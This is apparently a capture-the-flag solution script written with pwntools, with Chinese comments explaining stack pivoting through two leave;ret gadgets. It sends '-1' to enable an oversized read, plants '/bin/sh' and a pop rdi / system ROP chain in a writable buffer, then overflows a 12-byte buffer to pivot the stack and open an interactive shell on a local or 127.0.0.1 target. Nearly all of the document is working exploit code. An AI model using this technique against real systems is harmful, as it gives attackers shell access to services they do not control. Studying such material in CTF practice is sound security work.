from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

p = process('./pwn')
p = remote('127.0.0.1',61234)

# 最多能溢出28bytes buf 12 + old rbp 8 + ret addr
# 但是由于需要栈对齐, 还需要一个ret, 溢出大小不够, 执行栈迁移
# 栈迁移到desc的位置, 栈迁移依赖于连续两条leave; ret
# leave = mov rsp rbp;pop rbp, 即将rbp的值赋给rsp, 恢复进入该函数之前的rsp值, 然后从栈上pop出存储的old rbp, 恢复到caller的栈情况
# 此时如果再次执行leave, 将old rbp赋给rsp, 并再从栈上pop一个值作为rbp, 栈就可以被我们迁移到我们指定的位置
# 所以栈的结构应该为
# | old rbp | <-- 新栈的rsp
# | ret addr| <-- leave;ret gadget
# 
# 迁移之后执行什么?
# 我们需要知道, 在pop ebp的时候, esp是会执行一个+8的(在每次进行pop和push的时候esp都会变化)
# 那么在执行第二次leave中的pop rbp时, 会从新栈的rsp处pop一个值给到rbp
# 然后再执行ret, 从 rsp+8 处再pop一个值出来作为ret addr
# 所以目标栈的结构应该提前设置为
# new rsp --> | new rbp | <-- 新栈的rbp
# rsp+8   --> | new ret | <-- 栈迁移之后执行的目标地址
# rsp+16  --> | ...     | <-- 后续gadget和栈上变量等

bd = 0x40121E
# bd = 0x401226
system = 0x401230
newrbp = 0x404800
ret = 0x40133F
pop_rdi = 0x401219


# 这里输入-1可以引发大量输入
# pop_rdi binsh_addr system
p.recvuntil(b'tion.\n')
p.sendline(b'-1')
payload =b'/bin/sh\x00'+b'\x00'*(0x800-8)# + b'a'*0x10
payload += p64(newrbp)+p64(pop_rdi)+p64(0x404060)+p64(system)
p.send(payload)
# 上面的payload添加'a'*0x10,下面的payload添加+0x10就可以打通, 否则就打不通, 何意位
# 原来是0x700不够大小....
# 换成0x710正好够....

newrsp = 0x404060
leave_ret = 0x40133E
payload = b'a'*12 + p64(newrsp+0x800) + p64(leave_ret)
# payload = b'a'*12 + p64(newrsp+0x700+0x10) + p64(leave_ret)

print('pid'+str(proc.pidof(p)))
pause()

p.recvuntil(b':\n')
p.send(payload)

p.interactive()